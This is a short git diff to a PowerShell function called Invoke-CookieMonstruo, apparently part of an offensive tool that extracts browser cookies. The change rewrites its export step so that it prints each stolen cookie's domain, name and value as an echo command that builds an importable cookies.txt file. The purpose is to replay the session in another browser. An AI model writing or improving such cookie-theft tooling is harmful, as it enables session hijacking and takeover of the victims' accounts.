@@ -243,15 +243,16 @@ Function Invoke-CookieMonstruo{
     if($Exportable)
     {
         "`n[*] COOKIES IN NETSCAPE FORMAT"
-        "`n[!] Copy paste the following into a text file and import it on your browser`n"
+        "`n[!] Execute the following command in a terminal to output the cookie importable file`n"
+        Write-Host -NoNewLine "echo -e `""
         foreach ($cookie in $cookies)
         {
             $domain = $cookie.domain
             $name = $cookie.name
             $value = $cookie.value
-            "$domain`tTRUE`t/`tFALSE`t000000000`t$name`t$value`t" | Out-String
+            Write-Host -NoNewLine "$domain\tTRUE\t/\tFALSE\t000000000\t$name\t$value\n"
         }
-        "`n`n`n"
+        Write-Host "`" > cookies.txt `n"
     }
 
     
